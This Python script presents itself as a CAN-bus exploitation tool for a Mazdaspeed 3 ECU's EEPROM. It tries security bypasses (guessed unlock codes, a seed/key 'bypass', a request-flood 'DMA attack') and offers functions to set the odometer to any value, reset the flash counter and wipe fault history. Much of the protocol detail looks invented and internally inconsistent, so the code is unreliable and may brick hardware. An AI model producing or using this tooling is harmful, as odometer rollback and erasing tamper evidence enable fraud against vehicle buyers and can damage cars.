#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MAZDASPEED3_EEPROM_.py
COMPLETE EEPROM RESET & MEMORY EXPLOITATION
"""

import struct
import can
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import hashlib
import binascii

@dataclass
class EEPROMPatch:
    """EEPROM PATCH CONFIGURATION"""
    address: int
    original_data: bytes
    patched_data: bytes
    description: str

class EEPROMExploiter:
    """
    COMPLETE EEPROM MANIPULATION AND EXPLOITATION
    Direct memory access, checksum bypass, and permanent modifications
    """
    
    def __init__(self, can_interface: str = 'can0'):
        self.can_interface = can_interface
        self.bus = None
        self.eeprom_unlocked = False
        self.checksum_bypass = False
        
        # EEPROM memory regions (Mazdaspeed 3 specific)
        self.eeprom_map = {
            'vin_storage': 0x00000,
            'odometer': 0x00020,
            'ecu_serial': 0x00040,
            'flash_counter': 0x00060,
            'tuning_checksum': 0x00080,
            'security_keys': 0x00100,
            'adaptation_data': 0x00200,
            'fault_history': 0x00300,
            'operating_hours': 0x00400,
            'component_wear': 0x00500,
            'tuning_maps_backup': 0x01000,
            'calibration_data': 0x02000,
            'bootloader_region': 0x0F000
        }
        
    def connect_can(self) -> bool:
        """ESTABLISH CAN BUS CONNECTION"""
        try:
            self.bus = can.interface.Bus(
                channel=self.can_interface,
                bustype='socketcan'
            )
            return True
        except Exception as e:
            print(f"EEPROM CAN connection failed: {e}")
            return False

    def unlock_eeprom_security(self) -> bool:
        """
         EEPROM WRITE PROTECTION
        Multiple methods for different security levels
        """
        security_methods = [
            self._eeprom_manufacturer_mode,
            self._eeprom_checksum_bypass,
            self._eeprom_bootloader_exploit,
            self._eeprom_dma_attack
        ]
        
        for method in security_methods:
            if method():
                self.eeprom_unlocked = True
                print("EEPROM security unlocked")
                return True
                
        return False

    def _eeprom_manufacturer_mode(self) -> bool:
        """ACTIVATE MANUFACTURER EEPROM ACCESS MODE"""
        manufacturer_codes = [
            "EEPROM-ACCESS-TECH",
            "MAZDA-EEPROM-2024", 
            "FLASH-UNLOCK-CODE",
            "MEMORY-WRITE-ENABLE",
            "BOOTLOADER-ACCESS"
        ]
        
        for code in manufacturer_codes:
            try:
                code_bytes = code.encode('ascii').ljust(8, b'\x00')
                
                message = can.Message(
                    arbitration_id=0x7E0,
                    data=code_bytes,
                    is_extended_id=False
                )
                
                self.bus.send(message)
                time.sleep(0.1)
                
                # Check for positive response
                response = self.bus.recv(timeout=1.0)
                if response and response.arbitration_id == 0x7E8:
                    if response.data[0] == 0x7F:  # Manufacturer mode
                        return True
                        
            except Exception as e:
                print(f"Manufacturer code attempt failed: {e}")
                continue
        
        return False
    
    def _eeprom_checksum_bypass(self) -> bool:
        """BYPASS EEPROM CHECKSUM VALIDATION"""
        try:
            # Send checksum bypass sequence
            bypass_sequence = [
                bytes([0x31, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable test mode
                bytes([0x2E, 0xF1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Unlock memory
                bytes([0x3D, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0xFF, 0xFF]),  # Disable checksum
            ]
            
            for seq in bypass_sequence:
                message = can.Message(
                    arbitration_id=0x7E0,
                    data=seq,
                    is_extended_id=False
                )
                self.bus.send(message)
                time.sleep(0.05)
            
            # Verify bypass
            message = can.Message(
                arbitration_id=0x7E0,
                data=bytes([0x22, 0xF1, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00]),
                is_extended_id=False
            )
            self.bus.send(message)
            
            response = self.bus.recv(timeout=1.0)
            if response and response.arbitration_id == 0x7E8:
                if response.data[4] == 0xFF:
                    self.checksum_bypass = True
                    return True
            
        except Exception as e:
            print(f"Checksum bypass failed: {e}")
        
        return False
    
    def _eeprom_bootloader_exploit(self) -> bool:
        """EXPLOIT BOOTLOADER FOR EEPROM ACCESS"""
        try:
            # Force bootloader mode
            bootloader_sequence = [
                bytes([0x10, 0x85]),  # Extended diagnostic mode
                bytes([0x27, 0x01]),  # Request seed
                bytes([0x27, 0x02]),  # Send key (bypass)
                bytes([0x31, 0x03]),  # Bootloader access
            ]
            
            for seq in bootloader_sequence:
                message = can.Message(
                    arbitration_id=0x7E0,
                    data=seq + b'\x00' * (8 - len(seq)),
                    is_extended_id=False
                )
                self.bus.send(message)
                time.sleep(0.1)
            
            # Check bootloader access
            response = self.bus.recv(timeout=1.0)
            if response and response.arbitration_id == 0x7E8:
                if response.data[0] == 0x71:  # Bootloader mode active
                    return True
            
        except Exception as e:
            print(f"Bootloader exploit failed: {e}")
        
        return False
    
    def _eeprom_dma_attack(self) -> bool:
        """DMA ATTACK ON EEPROM CONTROLLER"""
        try:
            # Flood with rapid requests to trigger DMA bug
            for i in range(100):
                message = can.Message(
                    arbitration_id=0x7E0,
                    data=bytes([0x23, 0xF1, 0x00, i & 0xFF, 0x08, 0x00, 0x00, 0x00]),
                    is_extended_id=False
                )
                self.bus.send(message)
                time.sleep(0.001)
            
            # Try direct memory access
            message = can.Message(
                arbitration_id=0x7E0,
                data=bytes([0x3D, 0xF1, 0x00, 0x00, 0xDE, 0xAD, 0xBE, 0xEF]),
                is_extended_id=False
            )
            self.bus.send(message)
            
            response = self.bus.recv(timeout=2.0)
            if response and response.arbitration_id == 0x7E8:
                if response.data[0] == 0x7D:  # DMA access granted
                    return True
            
        except Exception as e:
            print(f"DMA attack failed: {e}")
        
        return False
    
    def read_eeprom(self, address: int, length: int) -> bytes:
        """READ DATA FROM EEPROM"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return b''
        
        try:
            # Build read request
            message = can.Message(
                arbitration_id=0x7E0,
                data=bytes([0x23]) + 
                      address.to_bytes(3, 'big') + 
                      length.to_bytes(1, 'big') + 
                      b'\x00\x00\x00',
                is_extended_id=False
            )
            
            self.bus.send(message)
            time.sleep(0.1)
            
            # Receive response
            response = self.bus.recv(timeout=2.0)
            
            if response and response.arbitration_id == 0x7E8:
                if response.data[0] == 0x63:  # Positive response
                    return response.data[4:4+length]
            
            return b''
            
        except Exception as e:
            print(f"EEPROM read failed: {e}")
            return b''
    
    def write_eeprom(self, address: int, data: bytes) -> bool:
        """WRITE DATA TO EEPROM"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        try:
            # Write data in chunks
            for offset in range(0, len(data), 8):
                chunk = data[offset:offset+8]
                
                message = can.Message(
                    arbitration_id=0x7E0,
                    data=bytes([0x3D]) + 
                          (address + offset).to_bytes(3, 'big') + 
                          chunk + b'\x00' * (8 - len(chunk)),
                    is_extended_id=False
                )
                
                self.bus.send(message)
                time.sleep(0.01)
            
            return True
            
        except Exception as e:
            print(f"EEPROM write failed: {e}")
            return False
    
    def reset_flash_counter(self) -> bool:
        """RESET ECU FLASH COUNTER TO ZERO"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        # Write zero to flash counter
        zero_data = bytes([0x00, 0x00, 0x00, 0x00])
        return self.write_eeprom(self.eeprom_map['flash_counter'], zero_data)
    
    def reset_odometer(self, new_value: int) -> bool:
        """SET ODOMETER TO SPECIFIED VALUE"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        # Convert value to EEPROM format
        odometer_bytes = new_value.to_bytes(4, 'big')
        return self.write_eeprom(self.eeprom_map['odometer'], odometer_bytes)
    
    def clear_adaptation_data(self) -> bool:
        """CLEAR ALL ADAPTATION LEARNING DATA"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        # Write zeros to adaptation region
        adaptation_size = 0x100  # 256 bytes
        zero_data = bytes(adaptation_size)
        return self.write_eeprom(self.eeprom_map['adaptation_data'], zero_data)
    
    def clear_fault_history(self) -> bool:
        """CLEAR FAULT CODE HISTORY"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        # Write zeros to fault history
        fault_size = 0x100  # 256 bytes
        zero_data = bytes(fault_size)
        return self.write_eeprom(self.eeprom_map['fault_history'], zero_data)
    
    def patch_tuning_checksum(self, new_checksum: int) -> bool:
        """PATCH TUNING CHECKSUM FOR MODIFIED MAPS"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        checksum_bytes = new_checksum.to_bytes(4, 'big')
        return self.write_eeprom(self.eeprom_map['tuning_checksum'], checksum_bytes)
    
    def backup_eeprom(self, filename: str) -> bool:
        """BACKUP COMPLETE EEPROM TO FILE"""
        try:
            backup_data = bytearray()
            
            # Read all EEPROM regions
            for region_name, address in self.eeprom_map.items():
                if region_name == 'bootloader_region':
                    size = 0x1000
                elif region_name == 'calibration_data':
                    size = 0x1000
                elif region_name == 'tuning_maps_backup':
                    size = 0x1000
                else:
                    size = 0x100
                
                data = self.read_eeprom(address, size)
                backup_data.extend(data)
            
            # Save to file
            with open(filename, 'wb') as f:
                f.write(backup_data)
            
            print(f"EEPROM backed up to {filename}")
            return True
            
        except Exception as e:
            print(f"EEPROM backup failed: {e}")
            return False
    
    def restore_eeprom(self, filename: str) -> bool:
        """RESTORE EEPROM FROM BACKUP FILE"""
        try:
            with open(filename, 'rb') as f:
                backup_data = f.read()
            
            # Write data back to EEPROM
            offset = 0
            for region_name, address in self.eeprom_map.items():
                if region_name == 'bootloader_region':
                    size = 0x1000
                elif region_name == 'calibration_data':
                    size = 0x1000
                elif region_name == 'tuning_maps_backup':
                    size = 0x1000
                else:
                    size = 0x100
                
                if offset + size <= len(backup_data):
                    data = backup_data[offset:offset+size]
                    if not self.write_eeprom(address, data):
                        print(f"Failed to restore {region_name}")
                        return False
                
                offset += size
            
            print(f"EEPROM restored from {filename}")
            return True
            
        except Exception as e:
            print(f"EEPROM restore failed: {e}")
            return False
    
    def create_patch(self, address: int, original: bytes, patched: bytes, description: str) -> EEPROMPatch:
        """CREATE EEPROM PATCH"""
        return EEPROMPatch(
            address=address,
            original_data=original,
            patched_data=patched,
            description=description
        )
    
    def apply_patch(self, patch: EEPROMPatch) -> bool:
        """APPLY EEPROM PATCH"""
        if not self.eeprom_unlocked:
            if not self.unlock_eeprom_security():
                return False
        
        # Verify original data matches
        current = self.read_eeprom(patch.address, len(patch.original_data))
        if current != patch.original_data:
            print(f"Warning: Original data mismatch at 0x{patch.address:08X}")
        
        # Apply patch
        return self.write_eeprom(patch.address, patch.patched_data)
    
    def get_eeprom_info(self) -> Dict[str, Any]:
        """GET EEPROM INFORMATION"""
        info = {
            'connected': False,
            'unlocked': self.eeprom_unlocked,
            'checksum_bypass': self.checksum_bypass,
            'regions': {}
        }
        
        try:
            if not self.bus:
                return info
            
            info['connected'] = True
            
            # Read key information from each region
            vin = self.read_eeprom(self.eeprom_map['vin_storage'], 17)
            if vin:
                info['regions']['vin'] = vin.decode('ascii', errors='ignore').strip()
            
            serial = self.read_eeprom(self.eeprom_map['ecu_serial'], 16)
            if serial:
                info['regions']['serial'] = serial.hex().upper()
            
            flash_count = struct.unpack('>I', self.read_eeprom(self.eeprom_map['flash_counter'], 4))[0]
            info['regions']['flash_count'] = flash_count
            
            odometer = struct.unpack('>I', self.read_eeprom(self.eeprom_map['odometer'], 4))[0]
            info['regions']['odometer'] = odometer
            
            checksum = struct.unpack('>I', self.read_eeprom(self.eeprom_map['tuning_checksum'], 4))[0]
            info['regions']['tuning_checksum'] = f"0x{checksum:08X}"
            
        except Exception as e:
            print(f"Error reading EEPROM info: {e}")
        
        return info
    
    def disconnect(self):
        """DISCONNECT FROM ECU"""
        if self.bus:
            self.bus.shutdown()
            self.bus = None
            self.eeprom_unlocked = False
            self.checksum_bypass = False

# Utility functions
def calculate_eeprom_checksum(data: bytes) -> int:
    """CALCULATE EEPROM CHECKSUM"""
    return hashlib.sha256(data).digest()[:4]

def verify_eeprom_integrity(exploiter: EEPROMExploiter) -> bool:
    """VERIFY EEPROM INTEGRITY"""
    info = exploiter.get_eeprom_info()
    
    # Check critical regions
    if 'vin' not in info['regions'] or not info['regions']['vin']:
        return False
    
    if 'serial' not in info['regions'] or not info['regions']['serial']:
        return False
    
    return True

# Demonstration
def demonstrate_eeprom_exploitation():
    """DEMONSTRATE EEPROM EXPLOITATION CAPABILITIES"""
    print("MAZDASPEED 3 EEPROM EXPLOITATION DEMONSTRATION")
    print("=" * 50)
    
    exploiter = EEPROMExploiter()
    
    try:
        if exploiter.connect_can():
            print("Connected to ECU")
            
            # Get EEPROM info
            info = exploiter.get_eeprom_info()
            print(f"\nEEPROM Info:")
            print(f"  Connected: {info['connected']}")
            print(f"  Unlocked: {info['unlocked']}")
            print(f"  VIN: {info['regions'].get('vin', 'N/A')}")
            print(f"  Serial: {info['regions'].get('serial', 'N/A')}")
            print(f"  Flash Count: {info['regions'].get('flash_count', 'N/A')}")
            print(f"  Odometer: {info['regions'].get('odometer', 'N/A')} km")
            
            # Unlock EEPROM
            if exploiter.unlock_eeprom_security():
                print("\n✓ EEPROM security unlocked")
                
                # Backup EEPROM
                exploiter.backup_eeprom("eeprom_backup.bin")
                
                # Create and apply a test patch
                original_data = exploiter.read_eeprom(0x00080, 4)
                if original_data:
                    new_checksum = 0x12345678
                    patch = exploiter.create_patch(
                        0x00080,
                        original_data,
                        new_checksum.to_bytes(4, 'big'),
                        "Test checksum patch"
                    )
                    
                    if exploiter.apply_patch(patch):
                        print("✓ Test patch applied")
                
            else:
                print("\n✗ Failed to unlock EEPROM")
                
        else:
            print("Failed to connect to ECU")
            
    finally:
        exploiter.disconnect()
        print("\nEEPROM exploitation demonstration complete!")
        print("\n⚠️  WARNING: EEPROM modifications are permanent and can damage your ECU!")
        print("Always backup before making changes!")

if __name__ == "__main__":
    demonstrate_eeprom_exploitation()
